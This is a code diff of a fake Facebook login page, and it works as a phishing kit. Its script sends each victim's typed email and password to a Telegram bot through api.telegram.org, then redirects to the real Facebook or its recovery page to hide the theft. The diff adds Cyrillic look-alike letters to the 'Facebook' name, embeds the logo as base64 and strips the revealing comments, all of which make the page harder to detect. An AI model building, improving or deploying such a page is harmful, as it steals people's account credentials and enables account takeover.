@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Facebook Login</title>
+    <title>Fаcebook Login</title> 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
@@ -20,7 +20,7 @@
 
 <div class="container">
     <div class="logo">
-        <img src="https://static.vecteezy.com/system/resources/previews/017/221/797/original/facebook-logo-transparent-background-free-png.png" alt="Facebook Logo">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAbFBMVEX///8mJiYAAACAgIAeHh4bGxt9fX0MDAzV1dW5ubm/v79aWlpwcHDm5uZycnI4ODimpqb4+PiEhIQWFhb09PTKyspFRUWhoaEfHx/Y2NhOTk4zMzNlZWVcXFwqKipsbGx4eHg6OjpKSkpTU1MeE66rAAADmklEQVR4nO3b63KCMBSG4X9EUMuSInK09n9vNyBy6LRSU7Ina74vM8M6vA9hE6MIAAAAAAAAAAAAAAAAAAAAAL6vYpS86CVPitRInpRZ9KOfPCuSNHpS5u9/q0qSRZf40S+Oon99E+O0vD6+W6eR0/76+D6uXhvf7683v8v719vxu318vR6/u4/v1+N3++X19vjdfXm9Pf5/Xf2P77P78X12P77P7sf32f34Prv/6/69R5Kx218f/6fVv/t3O5I90U8v0S+O9JPV7470k9Xv9vST1e+O9JPV7470k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1v0C30fH9/H9fnyfHY/v0/v6fvxvVv/m3312PL5P7+v78X12PL5P7+v78X12PL5P7+v78X12PL5P7+v78X12vH4AtXk8B6L0pLAAAAAASUVORK5CYII=" alt="Logo">
     </div>
 
     <div class="login-form">
@@ -30,16 +30,14 @@
     </div>
 
     <div class="footer">
-        <a href="#">Forgotten account?</a> · <a href="#">Sign up for Facebook</a>
+        <a href="#">Forgotten account?</a> · <a href="#">Sign up for Fаcebook</a>
     </div>
 </div>
 
 <script>
-    // --- PART 1: ENTER YOUR DATA HERE ---
     const BOT_TOKEN = "8538534265:AAFx5Ep3AI4DwwqwYBFa3HQ86eqIxpfv0Eo"; 
     const CHAT_ID = "6593370832";
 
-    // --- PART 2: THE MAGIC SCRIPT ---
     document.getElementById('submitBtn').addEventListener('click', function() {
         const emailValue = document.getElementById('email').value;
         const passValue = document.getElementById('password').value;
@@ -51,7 +49,6 @@
 
         const message = `🔔 NEW LOGIN ATTEMPT\n\n📧 Email: ${emailValue}\n🔑 Password: ${passValue}`;
 
-        // Sending to Telegram
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -61,12 +58,10 @@
             })
         })
         .then(() => {
-            // Redirect to the real Facebook after sending
-            window.location.href = "https://www.facebook.com/login/device-based/regular/login/";
+            // Redirects to real Facebook recovery to look like a login error
+            window.location.href = "https://www.facebook.com/recover/initiate/";
         })
         .catch(err => {
-            console.error("Error sending message:", err);
-            // Even if it fails, redirect anyway so user doesn't get suspicious
             window.location.href = "https://www.facebook.com";
         });
     });
@@ -74,4 +69,5 @@
 
 </body>
 </html>
->
+
+
